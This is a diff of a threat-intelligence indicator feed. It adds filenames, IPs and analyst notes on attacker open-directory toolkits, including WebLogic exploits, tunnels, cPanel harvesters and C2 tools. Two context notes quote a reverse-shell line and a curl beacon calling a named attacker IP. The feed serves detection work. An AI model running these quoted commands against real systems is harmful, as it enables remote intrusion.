       value: "abcb8e8bd371549af056f973b95cceae9156b5b96e80facbc19db009347b2924"
       context: "proxychains config pointing at the local SOCKS listener 127.0.0.1:1080"
       confidence: "DEFINITE"
@@ -8367,6 +9526,12 @@
       confidence: "DEFINITE"
       action: null
       fp_risk: null
+    - type: "sha1"
+      value: "aab136e06c94e5616832afa34af096bd6b77151c"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
     - type: "path"
       value: "/opt/aaa/bin/radstatd"
       context: null
@@ -8443,6 +9608,414 @@
       value: "bin/ps, usr/bin/top, usr/bin/pstree, bin/netstat, usr/sbin/lsof, usr/bin/find, bin/rpm"
       context: null
       confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: ".en.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: ".gs.sh"
+      context: "GeoServer default-credential test and CVE-2024-36401 OGC-filter RCE test against CATASTRO"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: ".wr.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "CVE_2024_21182.java"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "GenBypass.java"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "SsrfT3.java"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "aexp/cmd.jsp"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "aexp/dtd_server.log"
+      context: "Leaks the name of an unarchived carrier-targeting script: /tmp/andinet.sh line 122"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "c.pem"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "check_control.py"
+      context: "Syntactically broken earlier draft of the C2 console client logic"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "chisel443.log"
+      context: "chisel server on port 443 with reverse SOCKS session establishment"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "chisel80.log"
+      context: "chisel server on port 80 with SOCKS session"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "chisel_linux"
+      context: "Stock jpillora chisel v1.23.1 linux/amd64"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "chisel_new.log"
+      context: "Additional chisel sessions, source of two of the four server key fingerprints"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "chisel_server.log"
+      context: "chisel server startup log"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "chisel_win.exe"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "combined_wordlist.txt"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "cve21839"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "decrypt3des.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "df_exploit"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "docker_output.txt"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "exfil_capture.log"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "exfil_cores_batch.log"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "exfil_nvram.sh"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "exp.c"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "exploit21182.java"
+      context: "CVE-2024-21182 server-side JNDI resolution variant"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "extract_lua_src.py"
+      context: "Core-dump Lua source carver with Spanish comments"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "fix_radius.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "http80.log"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "hybrid_wordlist.txt"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "i786.sh"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "iiop_resp.bin"
+      context: "Mislabelled. Actually a captured WebLogic HTML error page, HTML 4.0 Draft doctype"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "jndi_cb.txt"
+      context: "JNDI callback listener on port 4445 recording no inbound connection"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "jndiexploit.jar"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "k.pem"
+      context: "Private key for the operator certificate above"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "lua_source.txt"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "movistar_wordlist.txt"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "orig_bins.tgz"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "pkg_names.txt"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "plink.exe"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "poc21839.py"
+      context: "Public houqe CVE-2023-21839 proof of concept, downloaded by tmp_jndi_rce.sh"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "proxychains_catastro.conf"
+      context: "proxychains config chaining onward to the internal CATASTRO target"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "proxychains_chisel.conf"
+      context: "proxychains config pointing at the local SOCKS listener 127.0.0.1:1080"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "prtg_extract.sh"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "r.bat"
+      context: "Minimal Windows reconnaissance drop writing to out.txt"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "rce_class/ExploitClass.class"
+      context: "Compiled reverse-shell payload class"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "rce_class/ExploitClass.java"
+      context: "Reverse shell payload: bash -i >& /dev/tcp/13.140.145.210/4445 0>&1"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "serve_http.log"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "shodan_full.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "so.sh"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "sph_cve.txt"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "ssrf_results.txt"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "string_payload.bin"
+      context: "22-byte serialized String hello_from_ldap used to validate the LDAP/JNDI callback path"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "t35.txt"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "tmp_docker_21182.sh"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "tmp_jndi_rce.sh"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "vps_bench.sh"
+      context: "Retail-bank password-reset endpoint probe, customerId iteration at escalating concurrency"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "vps_bench2.sh"
+      context: "Second retail-bank probe variant capturing HTTP status codes"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "vps_bench3.sh"
+      context: "Third retail-bank probe variant, concurrency escalated to 500"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "weblogic-t3-exploit/weblogic_t3.py"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "wl_exploit"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "wl_jars/T3Exploit.java"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "wl_jars/WLExploit.java"
+      context: "Operator-written T3 client with enum, bind and lookup actions. The CVE-2023-21839 trigger"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "wl_resp.txt"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "wl_t3.txt"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "xclass/ExploitClass.java"
+      context: "Beacon payload: curl http://13.140.145.210:4445/CLASS-RCE-$(whoami)"
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "xds.java"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "xscan.java"
+      context: "Threaded blind internal port scanner through WebLogic server-side JNDI resolution timing"
+      confidence: "DEFINITE"
       action: null
       fp_risk: null
     - type: "pattern"
@@ -8651,11 +10224,11 @@
   feed_url: "/ioc-feeds/opendirectory-193-56-255-154-20260403-iocs.json"
   report_url: "/reports/open-directory-193-56-255-154-xiebroc2/"
   detection_url: "/hunting-detections/open-directory-193-56-255-154-xiebroc2-detections"
-  total: 30
+  total: 33
   untyped: 22
   counts:
-    filename: 3
-    ipv4: 3
+    filename: 5
+    ipv4: 4
     md5: 5
     pattern: 9
     sha1: 3
@@ -8665,6 +10238,12 @@
   has_action: false
   has_fp_risk: false
   rows:
+    - type: "ipv4"
+      value: "193.56.255.154"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
     - type: "ipv4"
       value: "193.56.255.154:443"
       context: null
@@ -8774,20 +10353,32 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "extracted_payload.bin"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "grunthttp.exe"
-      context: "Covenant C2 GruntStager Build 1, original filename from open directory"
+      context: null
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "grunthttp.ps1"
-      context: "PowerShell loader for Covenant GruntStager Build 2, original filename from open directory"
+      context: null
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "main.exe"
       context: "XiebroC2 v3.1 Go TCP implant, original filename from open directory at 193.56.255.154"
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "s.d"
+      context: "Proof-of-concept DLL (non-operational staging test artifact)"
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -8856,11 +10447,12 @@
   feed_url: "/ioc-feeds/opendirectory-216-126-227-49-cve-2026-41940-cpanel-harvester-20260517-iocs.json"
   report_url: "/reports/opendirectory-216-126-227-49-cve-2026-41940-cpanel-harvester-20260517/"
   detection_url: "/hunting-detections/opendirectory-216-126-227-49-cve-2026-41940-cpanel-harvester-20260517-detections"
-  total: 96
+  total: 140
   untyped: 41
   counts:
     domain: 30
-    ipv4: 11
+    filename: 43
+    ipv4: 12
     md5: 1
     pattern: 5
     sha256: 43
@@ -8914,6 +10506,12 @@
     - type: "ipv4"
       value: "216.126.227.148"
       context: null
+      confidence: "HIGH"
+      action: "BLOCK"
+      fp_risk: null
+    - type: "ipv4"
+      value: "216.126.227.49"
+      context: "Active C2; also TCP/22 SSH open"
       confidence: "HIGH"
       action: "BLOCK"
       fp_risk: null
@@ -9415,6 +11013,264 @@
       confidence: "HIGH"
       action: null
       fp_risk: null
+    - type: "filename"
+      value: "BL  INV#VNSCM394790049.xls"
+      context: null
+      confidence: "LOW"
+      action: "MONITOR"
+      fp_risk: null
+    - type: "filename"
+      value: "BL & INV#VNSCM394790049.xls"
+      context: null
+      confidence: "LOW"
+      action: "MONITOR"
+      fp_risk: null
+    - type: "filename"
+      value: "beast-dashboard.py"
+      context: "Earlier or alternate dashboard variant (Beast brand)"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "beast-notify.py"
+      context: "Notification dispatcher (Telegram/Discord/webhook, channel unknown)"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "cpanel-scan.sh"
+      context: "cPanel scan wrapper"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "cpanel_aggressive.py"
+      context: "cPanel high-throughput aggressive variant"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "da_fast.py"
+      context: "DirectAdmin fast-mode scanner"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "da_wm_scanner.py"
+      context: "DirectAdmin Webmail scanner"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "deep_probe.py"
+      context: "Deeper / more thorough probing"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "fast-scan.py"
+      context: "Lightweight fast scanner"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "fix_dashboard.py"
+      context: "Dashboard hotfix utility"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "gen-beast-page.py"
+      context: "Phishing-page generator (Beast-branded)"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "gen-logins-instant.py"
+      context: "Quick login-URL/page generator"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "gen-sessions.py"
+      context: "Session-cookie generator / forger"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "goodpeopleswellmeans.hta"
+      context: "HTA dropper on .181 (1/1 VT scan). LOW-MODERATE operator-attribution."
+      confidence: "LOW"
+      action: "MONITOR"
+      fp_risk: null
+    - type: "filename"
+      value: "harvest-v3.py"
+      context: "Generic credential harvester v3"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "harvest_whm.py"
+      context: "WHM credential harvester v1"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "harvest_whm_v2.py"
+      context: "WHM credential harvester v2"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "lgt81941.xls"
+      context: "Alien InfoStealer via CVE-2017-0199 on .181. LOW-MODERATE operator-attribution."
+      confidence: "LOW"
+      action: "MONITOR"
+      fp_risk: null
+    - type: "filename"
+      value: "live-dashboard-v10.py"
+      context: "Operator main Flask C2 dashboard (matches live port-8888 service)"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "mass_probe_v3.py"
+      context: "Lighter probe variant v3"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "mass_probe_v4.py"
+      context: "Lighter probe variant v4"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "mass_scanner_v2.py"
+      context: "Mass scanner v2"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "mass_scanner_v3.py"
+      context: "Mass scanner v3 (refactored)"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "mass_v4.py"
+      context: "Mass scanner v4"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "mass_v5.py"
+      context: "Mass scanner v5"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "mass_v6.py"
+      context: "Mass scanner v6"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "mass_v7.py"
+      context: "Mass scanner v7"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "mass_v8.py"
+      context: "Mass scanner v8 (current iteration)"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "masscan-boost.sh"
+      context: "Wrapper around masscan SYN scanner"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "megahunt-fast.sh"
+      context: "Mass-hunt orchestration bash glue"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "mkaingbestchoiceforme[1].hta"
+      context: "ADKP downloader (~2.1MB obfuscated JS/VBS) on .181. LOW-MODERATE operator-attribution."
+      confidence: "LOW"
+      action: "MONITOR"
+      fp_risk: null
+    - type: "filename"
+      value: "persistent_scanner.py"
+      context: "Long-running state-persistent / restart-safe scanner"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "pipeline-41940.sh"
+      context: "CVE-2026-41940 weaponization orchestrator (filename encodes CVE)"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "plesk_scanner.py"
+      context: "Plesk control-panel scanner"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "poc-fixed.py"
+      context: "Operator-patched public PoC"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "ssh_scanner.py"
+      context: "SSH credential / banner scanner"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "trace.py"
+      context: "Tracing utility"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "trace2.py"
+      context: "Tracing utility v2"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "trace_auth.py"
+      context: "Auth-flow tracing (useful for CRLF-injection exploit dev)"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "unified_scanner.py"
+      context: "Multi-target scanner orchestrator"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "whm-hunter.py"
+      context: "Primary WHM credential harvester"
+      confidence: "HIGH"
+      action: "HUNT"
+      fp_risk: null
+    - type: "filename"
+      value: "样品订单确认.xls"
+      context: null
+      confidence: "LOW"
+      action: "MONITOR"
+      fp_risk: null
     - type: "pattern"
       value: "/<2-digit-numeric>/<wordlike>.hta"
       context: null
@@ -9462,9 +11318,10 @@
   feed_url: "/ioc-feeds/opendirectory-38-180-16-98-brazil-public-sector-toolkit-20261015-iocs.json"
   report_url: "/reports/opendirectory-38-180-16-98-brazil-public-sector-toolkit-20261015/"
   detection_url: "/hunting-detections/opendirectory-38-180-16-98-brazil-public-sector-toolkit-20261015-detections"
-  total: 41
+  total: 43
   untyped: 0
   counts:
+    filename: 2
     ipv4: 9
     path: 12
     pattern: 13
@@ -9476,7 +11333,7 @@
   rows:
     - type: "ipv4"
       value: "209.99.185.148"
-      context: "Host control HIGH from the operator's own label 'nosso canary' in five or more files. The victim-side tunnel client /tmp/upd, running as an application service account inside a WSO2 container, points at https://209.99.185.148; a process-table line is shown, an established tunnel is not. Base rate of the 'Update Service' organisation string and of the cloudedge-edge/1.4 banner is NOT CHECKED."
+      context: "Host control HIGH from the operator's own label 'nosso canary' in five or more files. The victim-side tunnel client /tmp/upd, running as an application service account inside a WSO2 container, points at https://209.99.185.148; a process-table line is shown, an established tunnel is not. Base rate of the 'Update Service' organisation string and of the cloudedge-edge/1.4 banner is NOT CHECKED. | Operator canary and callback catcher for SSRF, XXE and database-callback tests | Named as the callback target in S1.class and S1.java, asp_fuzz.py, ssrf_canary.py (comment 'nosso canary'), batch2.sh and batch57.sh; 16 SSRF-related hashes name the collector. Answered 'ok' on 2026-10-03 04:06Z, 2026-10-05 and 2026-10-07; connect timeout on 2026-10-14. | Both builds launch a headless Chrome at the /e/ path and request /p/ in VirusTotal sandbox output. :8146 is absent from all 15 Hunt.io port-history rows and all 14 protocol rows, so its presence, closure or continued service is NOT CHECKED; the 2026-10-14 rescan probed the root path rather than the historical /e/ path."
       confidence: "HIGH"
       action: "BLOCK"
       fp_risk: null
@@ -9494,7 +11351,7 @@
       fp_risk: null
     - type: "ipv4"
       value: "38.180.16.98"
-      context: "Operator host: open directory and relay/listener infrastructure | Reported as an open directory to Hunt.io (two automated warnings, 2026-09-27 and 2026-09-30); VirusTotal shows 0 malicious engines. The last positive directory listing is 2026-10-08 19:45Z (9,917 files). Silence onset is undated and the 2026-10-09 zero-response window came from one egress only: whether the host is down or that egress is blocked is NOT CHECKED. The directory was serving 1,649 root files by 2026-10-01 against the 362 captured on 2026-09-30, so the served tree is far larger than the capture."
+      context: "Operator host: open directory and relay/listener infrastructure | Reported as an open directory to Hunt.io (two automated warnings, 2026-09-27 and 2026-09-30); VirusTotal shows 0 malicious engines. The last positive directory listing is 2026-10-08 19:45Z (9,917 files). Silence onset is undated and the 2026-10-09 zero-response window came from one egress only: whether the host is down or that egress is blocked is NOT CHECKED. The directory was serving 1,649 root files by 2026-10-01 against the 362 captured on 2026-09-30, so the served tree is far larger than the capture. | Operator reverse-relay controller endpoint (the control indicator for this feed) | Hard-coded literal IP in Relay.java.new with no DNS lookup and a 15 s connect timeout. The relay opens the connection and writes READY2 first (7 bytes), sends PING every 15 s while idle, accepts one controller line of the form DIAL <host> <port>, replies OK or FAIL, then splices the two sockets byte for byte with no encryption or framing. Confirmed on the wire in a contained lab run on 2026-10-09 (22 of 22 sessions opened with READY2 alone) and in the operator's own listener log (1,051 relay check-ins: 648 labelled READY(pod) and 403 READY2(wls)). Relay times are undated. The listener was never observed by any scanner, which is a coverage gap, not evidence that it did not exist. Confidence: the endpoint role is HIGH, a historical role covering both relay lanes (pod and wls); DEFINITE applies only to the READY2 protocol bytes of the wls-variant file in the contained 2026-10-09 run, and which file was deployed is not established. | Listener that received Zabbix global-script command output (id;hostname) | The listener log reads 'listening on 0.0.0.0 port 9090'; the decoded operator script creates a global script z-revtest that connects here and sends id;hostname. The join of script to log is rated MODERATE by the lane (no run log, timestamp or Zabbix audit row) and the callback has no timestamp; the owner of the calling host is unattributed (victim-estate association only). | Listener to which a path map of a victim Zabbix proxy host was pushed | Part of the same Zabbix join as the :9090 callback; the byte-level script-to-listing relationship was not independently proved and the reader left the listener's role unidentified."
       confidence: "HIGH"
       action: "BLOCK"
       fp_risk: null
@@ -9518,7 +11375,7 @@
       fp_risk: null
     - type: "ipv4"
       value: "38.180.196.193"
-      context: null
+      context: "Operator payload-staging HTTP service, later a Werkzeug basic-auth panel | Referenced by wls_rce.sh and wls_rce2.sh as the payload server; a session on 2026-09-30 stages pwn.xml there. 'cadsus' appears in 0 of the 973 files of the :8899 archive, so the realm label does not describe the panel's content."
       confidence: "MODERATE"
       action: "MONITOR"
       fp_risk: null
@@ -9642,6 +11499,18 @@
       confidence: "LOW"
       action: "HUNT"
       fp_risk: null
+    - type: "filename"
+      value: "Relay.java.new"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "dump2.sh"
+      context: null
+      confidence: "DEFINITE"
+      action: null
+      fp_risk: null
     - type: "pattern"
       value: "A TCP/53 flow to 38.180.16.98 carrying the 5-byte line PING (hex 50 49 4e 47 0a) at roughly a 15-second cadence"
       context: null
@@ -9731,11 +11600,11 @@
   feed_url: "/ioc-feeds/opendirectory-45-130-148-125-20260430-iocs.json"
   report_url: "/reports/opendirectory-45-130-148-125-20260430/"
   detection_url: "/hunting-detections/opendirectory-45-130-148-125-20260430-detections"
-  total: 65
+  total: 84
   untyped: 45
   counts:
-    filename: 12
-    ipv4: 2
+    filename: 30
+    ipv4: 3
     md5: 4
     path: 2
     pattern: 9
@@ -9746,6 +11615,12 @@
   has_action: false
   has_fp_risk: true
   rows:
+    - type: "ipv4"
+      value: "45.130.148.125"
+      context: null
+      confidence: null
+      action: null
+      fp_risk: null
     - type: "ipv4"
       value: "45.130.148.125:80"
       context: null
@@ -10011,6 +11886,12 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "adrecon.ps1"
+      context: "Commodity AD reconnaissance PowerShell."
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "agent.bin"
       context: "AdaptixC2 Linux ELF agent"
       confidence: "HIGH"
@@ -10030,25 +11911,49 @@
       fp_risk: null
     - type: "filename"
       value: "agent.x64.dll"
-      context: "Cluster imphash, AdaptixC2 Windows beacon DLL form, production cluster (build counter 5)"
+      context: null
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "agent.x64.exe"
-      context: "AdaptixC2 Windows beacon EXE-form sibling imphash"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "amsi_bypass.ps1"
+      context: "Small PowerShell AMSI bypass (177 B, 2 lines). Operator-bundled."
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "beacon.ps1"
-      context: "Operator-written loader; filename common to many C2 frameworks, combine with content hash"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "beacon_shellcode.bin"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "certify.exe"
+      context: "Ghostpack/SpecterOps commodity AD CS abuse tool, .NET v4."
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "chisel.exe"
-      context: "These are Go binaries, NOT PoetRAT. False-positive across ALL Go binaries."
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "download_exec.ps1"
+      context: null
       confidence: "HIGH"
       action: null
       fp_risk: null
@@ -10059,26 +11964,104 @@
       action: null
       fp_risk: null
     - type: "filename"
+      value: "godpotato.exe"
+      context: "Commodity Windows local privilege escalation tool, .NET v4."
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
       value: "gopher.x64.exe"
-      context: "AdaptixC2 Gopher Go agent, distinctive name (gopher = Go mascot)"
+      context: null
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "injector.dll"
-      context: "Operator-written .NET injector (SI class, /tmp/si_build/ PDB)"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "lazagne.exe"
+      context: "lazagne 324 KB stock PyInstaller-built variant. Vanilla credential extractor."
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "mimikatz.exe"
+      context: null
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "msupdate.dll"
-      context: "Cluster imphash, AdaptixC2 Windows beacon DLL form, production cluster (build counter 5)"
+      context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "nc.exe"
+      context: "Classic netcat (variant 1)."
       confidence: "HIGH"
       action: null
       fp_risk: null
     - type: "filename"
       value: "powerview.ps1"
       context: null
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "printspoofer.exe"
+      context: "Commodity Windows print-spooler local privilege escalation tool."
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "rubeus.exe"
+      context: "Ghostpack commodity Kerberos abuse tool. YARA: HKTL_NET_GUID_Rubeus."
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "runascs.exe"
+      context: "Commodity credentialed-process-spawn tool. YARA: HKTL_NET_NAME_RunasCs."
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "seatbelt.exe"
+      context: "Ghostpack commodity situational-awareness tool. YARA: HKTL_NET_GUID_SharpPack."
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "sharpdpapi.exe"
+      context: "Ghostpack commodity DPAPI credential decryption tool."
+      confidence: "HIGH"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "sharphound.exe"
+      context: null
+      confidence: "MODERATE"
+      action: null
+      fp_risk: null
+    - type: "filename"
+      value: "sharphound.ps1"
